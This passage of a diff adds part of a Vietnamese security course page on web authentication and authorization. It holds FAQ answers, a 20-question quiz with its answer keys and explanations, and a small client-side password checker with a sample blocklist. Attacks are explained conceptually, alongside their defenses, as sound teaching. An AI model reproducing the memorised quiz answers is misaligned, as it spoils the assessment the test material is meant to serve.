+<p>Code của SPA (JavaScript tải về browser), app desktop/mobile (file nhị phân cài trên máy người dùng) đều có thể bị đọc/dịch ngược. Secret nhúng trong đó là “bí mật” chung cho mọi người cài app — không chứng minh được gì. Vì vậy public client dùng PKCE để bảo vệ authorization code thay vì secret (<a href="m03-oauth-oidc.html#pkce">M03</a>).</p></details>
+<details><summary>Cookie <code>HttpOnly</code> giúp gì và không giúp gì?</summary>
+<p><b>Giúp:</b> JavaScript (kể cả script XSS) không đọc được giá trị cookie → không mang cookie đi dùng ở máy khác. <b>Không giúp:</b> XSS vẫn gửi request từ browser nạn nhân (cookie tự động đính kèm); không chống CSRF (cần SameSite/anti-CSRF); không chống MITM (cần <code>Secure</code> + TLS); không chống session fixation.</p></details>
+<details><summary>CSRF và XSS khác nhau thế nào?</summary>
+<p>CSRF: code của kẻ tấn công chạy ở <b>site khác</b>, lợi dụng browser tự gửi cookie để gửi request “mù”, không đọc được response. XSS: script độc chạy <b>trong origin của app</b>, đọc được DOM/storage/response và làm mọi thứ app làm được. XSS vượt qua được mọi biện pháp chống CSRF.</p></details>
+<details><summary>Vì sao access token cần có audience phù hợp?</summary>
+<p><code>aud</code> cho biết token được phát hành cho API nào. Nếu API không kiểm tra <code>aud</code>, một token cấp cho API A (có thể kém tin cậy hoặc bị lộ) có thể bị đem đi gọi API B — kiểu “token forwarding/confused deputy”. Kiểm tra <code>aud</code> giới hạn phạm vi thiệt hại khi một token bị lộ.</p></details>
+<details><summary>Vì sao OTP/push không chống được AiTM phishing nhưng passkey thì có?</summary>
+<p>OTP/push không gắn với domain: người dùng nhập OTP hoặc approve push trên trang proxy, proxy chuyển tiếp tới IdP thật và nhận session cookie sau MFA. Passkey thì browser ký kèm origin thực tế và authenticator chỉ dùng credential cho đúng RP ID — trang proxy ở domain khác không lấy được chữ ký hợp lệ cho domain thật.</p></details>
+<details><summary>Lưu access token trong <code>localStorage</code> có rủi ro gì?</summary>
+<p>Bất kỳ script nào chạy trong origin (XSS, thư viện bên thứ ba bị chèn mã) đều đọc được và gửi token ra ngoài; token tiếp tục dùng được từ máy kẻ tấn công cho đến khi hết hạn — tệ hơn nếu lưu cả refresh token. Ngoài ra localStorage tồn tại lâu, kể cả sau khi đóng browser.</p></details>
+<details><summary>Vì sao NIST không khuyến nghị bắt đổi mật khẩu định kỳ?</summary>
+<p>Đổi định kỳ khiến người dùng chọn mật khẩu theo mẫu dễ đoán hoặc ghi lại, làm giảm an toàn thực tế. SP 800-63B-4 quy định verifier SHALL NOT bắt đổi định kỳ, chỉ SHALL bắt đổi khi có bằng chứng bị lộ; thay vào đó dùng độ dài, blocklist, MFA và rate limiting.</p></details>
+
+<div class="callout tip"><span class="callout-title">✅ Tiêu chí hoàn thành</span>
+Có thể phân tích một request từ lúc xác minh token đến lúc quyết định authorization (pipeline ở <a href="#authz-pipeline">B.1</a>), đồng thời đưa ra biện pháp giảm thiểu các rủi ro phổ biến (bảng <a href="#threats">C</a>).</div>
+
+<h2 id="quiz">Quiz trắc nghiệm</h2>
+<div id="quiz"></div>
+
+</main>
+<script>
+window.QUIZ = [
+  { q: "Access token của An hợp lệ, có scope <code>orders.read</code>. An gọi <code>GET /orders/1024</code> — đơn của phòng ban khác. API nên trả gì?",
+    options: ["200 OK vì token có scope orders.read", "401 Unauthorized", "403 Forbidden (hoặc 404 nếu không muốn lộ đơn tồn tại)", "400 Bad Request"],
+    answer: 2,
+    explain: "Authentication đã thành công; scope chỉ giới hạn client. Quyền trên <b>đơn cụ thể</b> do resource-based authorization quyết định → 403, hoặc 404 để không lộ sự tồn tại." },
+  { q: "Phát biểu nào đúng về scope và role?",
+    options: ["Scope và role là hai tên gọi của cùng một thứ", "Role do client tự khai báo khi xin token", "Có role Manager thì mọi client đều được duyệt đơn thay user", "Scope giới hạn những gì client được làm thay user; role mô tả user là ai trong tổ chức"],
+    answer: 3,
+    explain: "Scope do Authorization Server cấp cho <b>client</b>; role thuộc về <b>user</b>. Quyền hiệu lực là giao của hai thứ cộng rule tài nguyên." },
+  { q: "Hệ thống có các role <code>Manager_SalesHN</code>, <code>Manager_SalesHCM</code>, <code>Manager_SalesHN_Under50M</code>… liên tục tăng. Đây là triệu chứng gì và hướng xử lý?",
+    options: ["Role explosion — đưa điều kiện phòng ban/hạn mức thành thuộc tính (ABAC) kết hợp role Manager", "ACL quá lớn — chuyển sang RBAC", "Token quá lớn — giảm lifetime", "Session fixation — cấp session mới"],
+    answer: 0,
+    explain: "RBAC thuần không biểu diễn được context nên role phình ra. Dùng role <code>Manager</code> + policy theo thuộc tính (department, amount)." },
+  { q: "Ứng dụng kiểu Google Drive: user được sửa file nếu là editor của file, hoặc của folder cha, hoặc thuộc team sở hữu folder. Mô hình nào tự nhiên nhất?",
+    options: ["RBAC", "Basic authentication", "Chỉ dùng OAuth scope", "ReBAC"],
+    answer: 3,
+    explain: "Quyền suy ra từ <b>quan hệ</b> và kế thừa trong đồ thị → ReBAC (kiểu Google Zanzibar, OpenFGA)." },
+  { q: "Trong ASP.NET Core, vì sao không thể kiểm tra “user là chủ đơn hàng” chỉ bằng <code>[Authorize(Policy=...)]</code>?",
+    options: ["Vì attribute không hỗ trợ policy", "Vì phải dùng middleware riêng cho mỗi đơn", "Vì attribute được đánh giá trước khi tài nguyên được tải; cần gọi <code>IAuthorizationService.AuthorizeAsync(user, resource, ...)</code> sau khi tải", "Vì JwtBearer không hỗ trợ claims"],
+    answer: 2,
+    explain: "Declarative authorization chạy trước data binding/tải dữ liệu. Resource-based authorization là <b>imperative</b>: tải order rồi gọi <code>AuthorizeAsync</code>." },
+  { q: "Mục đích của <code>options.FallbackPolicy = new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build()</code> là gì?",
+    options: ["Deny by default: endpoint không khai báo authorization metadata vẫn yêu cầu người dùng đã xác thực", "Cho phép mọi request ẩn danh", "Thay thế JwtBearer", "Tự động kiểm tra ownership"],
+    answer: 0,
+    explain: "Fallback policy áp dụng khi endpoint không có metadata authorization; endpoint công khai phải được đánh dấu <code>[AllowAnonymous]</code> có chủ đích." },
+  { q: "Trong <code>AuthorizationHandler&lt;OperationAuthorizationRequirement, Order&gt;</code>, nếu handler không gọi <code>context.Succeed(requirement)</code> thì sao?",
+    options: ["Request được cho phép", "Requirement không được thỏa → authorization thất bại (deny)", "Ném exception 500", "Chuyển sang 401"],
+    answer: 1,
+    explain: "Không gọi Succeed = không có bằng chứng cho phép → deny. Đây là deny by default ở mức handler." },
+  { q: "Chi đổi <code>/orders/2001</code> thành <code>/orders/1024</code> và đọc được đơn của An. Lỗi này là gì?",
+    options: ["CSRF", "Session fixation", "MITM", "BOLA/IDOR — OWASP API1:2023"],
+    answer: 3,
+    explain: "API thiếu kiểm tra quyền ở mức object. Token của Chi hợp lệ; lỗi nằm ở authorization." },
+  { q: "Những biện pháp nào giúp chống CSRF cho ứng dụng dùng cookie session? (chọn nhiều)",
+    options: ["Cookie <code>SameSite=Lax</code> hoặc <code>Strict</code>", "Anti-forgery token / custom header được kiểm tra ở server", "Đặt cookie <code>HttpOnly</code> là đủ", "Kiểm tra header <code>Origin</code>"],
+    answer: [0, 1, 3],
+    explain: "HttpOnly chỉ ngăn JS đọc cookie, không ngăn browser tự gửi cookie trong request cross-site → không chống CSRF." },
+  { q: "SPA lưu access token và refresh token trong <code>localStorage</code>. Có lỗi XSS. Hậu quả tệ nhất là gì?",
+    options: ["Không sao vì token đã ký", "Script đọc token và gửi ra ngoài; kẻ tấn công dùng token từ máy khác, kéo dài bằng refresh token", "Chỉ bị CSRF", "Token tự bị revoke"],
+    answer: 1,
+    explain: "localStorage đọc được bởi mọi script trong origin. Refresh token bị lộ cho phép duy trì truy cập lâu dài." },
+  { q: "Phát biểu nào đúng về token storage?",
+    options: ["Cookie HttpOnly miễn nhiễm hoàn toàn với XSS", "BFF giữ token ở server nên không cần chống CSRF", "Không có nơi lưu nào miễn nhiễm XSS; cách lưu chỉ giới hạn mức thiệt hại", "Lưu token trong memory là an toàn tuyệt đối"],
+    answer: 2,
+    explain: "XSS vẫn gửi request như người dùng dù token ở đâu. BFF dùng cookie nên <b>cần</b> chống CSRF." },
+  { q: "Người dùng nhận 20 push “Approve sign-in?” lúc 2 giờ sáng và cuối cùng bấm Approve. Biện pháp nào trực tiếp nhất chặn kiểu tấn công này?",
+    options: ["Bắt đổi mật khẩu mỗi 90 ngày", "Tăng độ dài session", "Number matching + giới hạn số push + hiển thị ngữ cảnh", "Chuyển sang SMS OTP"],
+    answer: 2,
+    explain: "MFA fatigue bị chặn khi user phải nhập số hiển thị trên màn hình đăng nhập mà kẻ tấn công không cho họ thấy." },
+  { q: "Vì sao OTP không chống được AiTM phishing?",
+    options: ["Vì proxy chuyển tiếp OTP tới IdP thật trong thời gian thực và lấy session cookie sau khi MFA hoàn tất", "Vì OTP quá ngắn", "Vì OTP luôn gửi qua SMS", "Vì OTP không có thời hạn"],
+    answer: 0,
+    explain: "OTP không gắn với origin. AiTM là reverse proxy nên nhận được session cookie hợp lệ." },
+  { q: "Yếu tố nào khiến passkey/FIDO2 chống được AiTM? (chọn nhiều)",
+    options: ["Browser đưa origin thực tế vào dữ liệu được ký", "Credential gắn với RP ID (domain) của site thật", "Passkey dài hơn mật khẩu", "Người dùng không có bí mật nào để gõ vào trang giả"],
+    answer: [0, 1, 3],
+    explain: "Phishing resistance đến từ việc gắn với origin/RP ID, không phải độ dài." },
+  { q: "Kẻ tấn công đổi header JWT thành <code>HS256</code> và ký bằng public key RSA của IdP. Biện pháp nào chặn được?",
+    options: ["Tăng lifetime token", "Đọc thuật toán từ header token để biết cách verify", "Bỏ kiểm tra chữ ký khi có <code>kid</code>", "Server allowlist thuật toán (vd chỉ RS256) và khóa RSA chỉ dùng cho RS256"],
+    answer: 3,
+    explain: "Server phải quyết định thuật toán; không tin <code>alg</code> trong header. Trong .NET: <code>ValidAlgorithms</code>." },
+  { q: "Theo NIST SP 800-63B-4, mật khẩu là yếu tố xác thực <b>duy nhất</b> phải dài tối thiểu bao nhiêu?",
+    options: ["8 ký tự", "12 ký tự", "15 ký tự", "64 ký tự"],
+    answer: 2,
+    explain: "SHALL tối thiểu 15 ký tự khi single-factor; 8 ký tự khi chỉ dùng trong MFA; độ dài tối đa cho phép SHOULD ≥ 64." },
+  { q: "Chính sách nào <b>trái</b> với NIST SP 800-63B-4? (chọn nhiều)",
+    options: ["Bắt buộc có chữ hoa, số và ký tự đặc biệt", "Bắt đổi mật khẩu mỗi 90 ngày", "So sánh mật khẩu mới với danh sách mật khẩu đã lộ", "Dùng câu hỏi bảo mật để khôi phục"],
+    answer: [0, 1, 3],
+    explain: "Composition rules, đổi định kỳ và KBA đều là SHALL NOT. Blocklist là SHALL." },
+  { q: "Sau khi đăng nhập, ứng dụng giữ nguyên session ID mà người dùng có từ trước khi đăng nhập. Rủi ro nào?",
+    options: ["Session fixation", "SIM swap", "Open redirect", "Account enumeration"],
+    answer: 0,
+    explain: "Kẻ tấn công cài sẵn session ID cho nạn nhân; sau khi nạn nhân đăng nhập, ID đó trở thành phiên hợp lệ. Phòng vệ: cấp ID mới sau login." },
+  { q: "Form “Quên mật khẩu” trả “Không tìm thấy tài khoản với email này”. Vấn đề và cách sửa?",
+    options: ["Không có vấn đề", "CSRF — thêm SameSite", "Account enumeration — trả thông báo chung “nếu email tồn tại, chúng tôi đã gửi hướng dẫn” và rate limit", "XSS — thêm CSP"],
+    answer: 2,
+    explain: "Thông báo khác nhau cho phép dò email nào có tài khoản, phục vụ phishing/stuffing." },
+  { q: "API chỉ nhận <code>Authorization: Bearer</code> (không dùng cookie) có cần anti-CSRF token không, và rủi ro chính chuyển sang đâu?",
+    options: ["Thường không cần theo kiểu cổ điển vì browser không tự gắn header Authorization; rủi ro chính chuyển sang việc token bị đọc qua XSS", "Có, CSRF là rủi ro chính", "Không cần gì vì Bearer token miễn nhiễm mọi tấn công", "Cần thay Bearer bằng Basic auth"],
+    answer: 0,
+    explain: "CSRF lợi dụng credential tự động gửi. Token do JS gắn thì không bị CSRF nhưng nhạy cảm với XSS và token theft." }
+];
+</script>
+<script>
+(function () {
+  var block = ["password","password123","123456789012345","qwertyuiopasdfg","iloveyou","admin","letmein","welcome","p@ssw0rd","p@ssw0rd1","spring2026!","summer2026!","companyname2026","matkhau123","123456","12345678","abc123"];
+  var btn = document.getElementById("pw-check");
+  if (!btn) return;
+  btn.addEventListener("click", function () {
+    var pw = document.getElementById("pw-input").value;
+    var mfa = document.getElementById("pw-mfa").checked;
+    var len = Array.from(pw.normalize("NFC")).length;
+    var min = mfa ? 8 : 15;
+    var lines = [];
+    lines.push((len >= min ? "✅" : "❌") + " Độ dài " + len + " code point (tối thiểu " + min + (mfa ? ", vì dùng trong MFA" : ", vì là yếu tố duy nhất") + ")");
+    lines.push((len <= 64 ? "✅" : "ℹ️") + " Hệ thống nên cho phép tối đa ≥ 64 ký tự" + (len > 64 ? " — mật khẩu này dài hơn 64, verifier vẫn nên chấp nhận nếu hỗ trợ" : ""));
+    var inBlock = block.indexOf(pw.toLowerCase()) >= 0;
+    lines.push((inBlock ? "❌ Nằm trong blocklist mẫu (mật khẩu phổ biến/đã lộ)" : "✅ Không nằm trong blocklist mẫu (nhỏ)"));
+    lines.push("ℹ️ Không áp quy tắc chữ hoa/số/ký tự đặc biệt (SHALL NOT composition rules).");
+    var ok = len >= min && !inBlock;
+    lines.push(ok ? "→ Chấp nhận theo các tiêu chí trên." : "→ Từ chối và giải thích lý do cho người dùng.");
+    document.getElementById("pw-out").textContent = lines.join("\n");
+  });
+})();
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
